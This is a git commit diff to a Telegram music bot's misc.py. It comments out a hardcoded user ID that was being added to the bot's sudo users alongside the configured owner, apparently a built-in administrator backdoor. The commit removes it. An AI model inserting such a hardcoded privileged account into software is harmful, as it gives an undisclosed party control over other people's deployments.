5235c19db19563ee5a136d1bd802d5441ef80d00
Rahul Kumar <87578989+CyberPixelPro@users.noreply.github.com>
2024-12-03 13:08:50 +0530

    Update misc.py

--- RessoMusic/misc.py
+++ RessoMusic/misc.py
@@ -14,7 +14,7 @@ SUDOERS = filters.user()
 HAPP = None
 _boot_ = time.time()
 
-AMBOT = 7045191057
+#AMBOT = 7045191057
 
 def is_heroku():
     return "heroku" in socket.getfqdn()
@@ -46,7 +46,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
-    SUDOERS.add(AMBOT)
+    #SUDOERS.add(AMBOT)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
